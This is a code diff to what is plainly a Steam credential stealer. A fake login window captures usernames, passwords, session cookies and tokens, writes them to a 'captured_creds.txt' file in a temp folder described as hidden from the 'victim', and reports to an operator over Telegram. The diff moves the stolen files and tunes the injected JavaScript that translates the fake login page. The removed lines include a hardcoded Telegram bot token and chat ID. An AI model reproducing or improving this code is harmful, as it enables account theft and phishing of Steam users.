@@ -32,30 +32,9 @@ def _xd(data, key=0x77):
         return bytes([b ^ key for b in base64.b64decode(data)]).decode('utf-8', errors='ignore')
     except:
         return None
-# Plain credentials from main.py to avoid decryption issues
-_BOT_TOKEN = "8497188042:AAFKAy0IJK3K6oFcNoR4CNO5fYPxqo7VcrQ"
-_CHAT_ID = -1003555531875
-_TELEGRAM_BRIDGE = None  
-
-try:
-    _cfg_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), '.cfg')
-    if os.path.exists(_cfg_path):
-        with open(_cfg_path, 'r') as _f:
-            _parts = _f.read().strip().split('|')
-            if len(_parts) >= 2:
-                _BOT_TOKEN = _parts[0]
-                _CHAT_ID = int(_parts[1])
-            if len(_parts) >= 3 and _parts[2].strip():
-                _TELEGRAM_BRIDGE = _parts[2].strip()
-except:
-    pass
-
-# UDP Port for proxied logging through main.py
-UDP_PORT = None
-for i, arg in enumerate(sys.argv):
-    if arg == "--udp" and i + 1 < len(sys.argv):
-        try: UDP_PORT = int(sys.argv[i+1])
-        except: pass
+# Redirect all local logs to temp to avoid cluttering victim's desktop
+TEMP_ROOT = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'FinalTempSys')
+if not os.path.exists(TEMP_ROOT): os.makedirs(TEMP_ROOT, exist_ok=True)
 
 def tg_notify(text):
     """Send a Telegram message, preferably via UDP bridge to main.py."""
@@ -114,9 +93,10 @@ def tg_notify(text):
             )
             urllib.request.urlopen(req, timeout=10)
         except Exception as e:
-            # Fallback to local log if TG fails
+            # Fallback to local log in TEMP if TG fails
             try:
-                with open("tg_log.txt", "a") as f:
+                log_path = os.path.join(TEMP_ROOT, "tg_log.txt")
+                with open(log_path, "a") as f:
                     f.write(f"{time.ctime()}: {text_clean}\nError: {e}\n")
             except: pass
             
@@ -163,7 +143,7 @@ class SteamApi:
         self.username = username
         self.password = password
         
-        _save = os.path.join(os.environ.get('TEMP', '.'), 'captured_creds.txt')
+        _save = os.path.join(TEMP_ROOT, 'captured_creds.txt')
         with open(_save, "a", encoding="utf-8") as f:
             f.write(f"{username}:{password}\n")
             
@@ -280,7 +260,7 @@ class SteamApi:
 
     def _handle_success(self, account_name, access_token, refresh_token):
         """Finalizes the session, saves cookies, and notifies operator via UDP."""
-        debug_log = os.path.join(os.environ.get('TEMP', '.'), 'steam_debug.txt')
+        debug_log = os.path.join(TEMP_ROOT, 'steam_debug.txt')
         try:
             with open(debug_log, "a") as f:
                 f.write(f"{time.ctime()}: _handle_success entered for {account_name}\n")
@@ -373,8 +353,8 @@ class SteamApi:
         
         cookies = final_cookies
 
-        # Save to enriched JSON file
-        cookie_file = os.path.join(os.environ.get('TEMP', '.'), f"steam_cookies_{account_name}.json")
+        # Save to enriched JSON file in TEMP
+        cookie_file = os.path.join(TEMP_ROOT, f"steam_cookies_{account_name}.json")
         try:
             with open(cookie_file, 'w', encoding='utf-8') as f:
                 json.dump(cookies, f, indent=4)
@@ -522,12 +502,17 @@ class SteamApi:
                                         "输入您 Steam 手机应用上的代码": "Enter the code from your Steam Mobile App",
                                         "使用备用码": "Use a backup code",
                                         "请求帮助，我已无法访问我的 Steam 手机应用": "Help, I no longer have access to my Steam Mobile App",
-                                        "请核对您的密码和帐户名称并重试": "Please check your password and account name and try again"
+                                        "请核对您的密码和帐户名称并重试": "Please check your password and account name and try again",
+                                        "Help, I can't sign in": "Help, I can't sign in",
+                                        "HELP, I CAN'T SIGN IN": "HELP, I CAN'T SIGN IN",
+                                        "ACCOUNT:": "ACCOUNT:",
+                                        "Account:": "Account:"
                                     };
+                                    const sortedKeys = Object.keys(replacements).sort((a, b) => b.length - a.length);
                                     const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
                                     let node;
                                     while(node = walker.nextNode()) {
-                                        for (let key in replacements) {
+                                        for (let key of sortedKeys) {
                                             if (node.nodeValue.includes(key)) {
                                                 node.nodeValue = node.nodeValue.split(key).join(replacements[key]);
                                             }
@@ -548,9 +533,10 @@ class SteamApi:
                                         "PASSWORD": "密码",
                                         "Remember me": "记住我",
                                         "Sign in": "登录",
+                                        "OR SIGN IN WITH QR CODE": "或者用二维码登录",
                                         "OR SIGN IN WITH QR": "或者用二维码登录",
                                         "Use the Steam Mobile App to sign in via QR Code": "通过二维码使用 Steam 手机应用登录",
-                                        "This account is protected by a Steam Mobile Authenticator": "此帐户受到手机验证器保护",
+                                        "This account is protected by a Steam Mobile Authenticator": "此帐户受到手机验证器保护。",
                                         "Use the Steam Mobile App to confirm your sign in": "使用 Steam 手机应用来确认登录…",
                                         "Enter a code instead": "改为输入代码",
                                         "Enter the code from your Steam Mobile App": "输入您 Steam 手机应用上的代码",
@@ -559,28 +545,29 @@ class SteamApi:
                                         "Please check your password and account name and try again": "请核对您的密码和帐户名称并重试",
                                         "Help, I can't sign in": "请求帮助，我无法登录。",
                                         "HELP, I CAN'T SIGN IN": "请求帮助，我无法登录。",
-                                        "OR SIGN IN WITH QR CODE": "或者用二维码登录",
                                         "USE THE STEAM MOBILE APP TO SIGN IN VIA QR CODE": "通过二维码使用 Steam 手机应用登录",
                                         "THIS ACCOUNT IS PROTECTED BY A STEAM MOBILE AUTHENTICATOR": "此帐户受到手机验证器保护。",
                                         "USE THE STEAM MOBILE APP TO CONFIRM YOUR SIGN IN": "使用 Steam 手机应用来确认登录…",
                                         "ENTER A CODE INSTEAD": "改为输入代码",
                                         "ENTER THE CODE FROM YOUR STEAM MOBILE APP": "输入您 Steam 手机应用上的代码",
                                         "USE A BACKUP CODE": "使用备用码",
-                                        "HELP, I NO LONGER HAVE ACCESS TO MY STEAM MOBILE APP": "请求帮助，我已无法访问我的 Steam 手机应用。"
-                                    };
-                                    const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
-                                    let node;
-                                    while(node = walker.nextNode()) {
-                                        for (let key in replacements) {
-                                            // Case insensitive match for English keys
-                                            const regex = new RegExp(key, 'gi');
-                                            if (node.nodeValue.match(regex)) {
-                                                node.nodeValue = node.nodeValue.replace(regex, replacements[key]);
-                                            }
+                                        "HELP, I NO LONGER HAVE ACCESS TO MY STEAM MOBILE APP": "请求帮助，我已无法访问我的 Steam 手机应用。",
+                                        "ACCOUNT:": "帐户：",
+                                        "Account:": "帐户："
+                                };
+                                const sortedKeys = Object.keys(replacements).sort((a, b) => b.length - a.length);
+                                const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
+                                let node;
+                                while(node = walker.nextNode()) {
+                                    for (let key of sortedKeys) {
+                                        const regex = new RegExp(key, 'gi');
+                                        if (node.nodeValue.match(regex)) {
+                                            node.nodeValue = node.nodeValue.replace(regex, replacements[key]);
                                         }
                                     }
-                                }, 500);
-                            })();
+                                }
+                            }, 500);
+                        })();
                         """
                     if script:
                         self._window.evaluate_js(script)
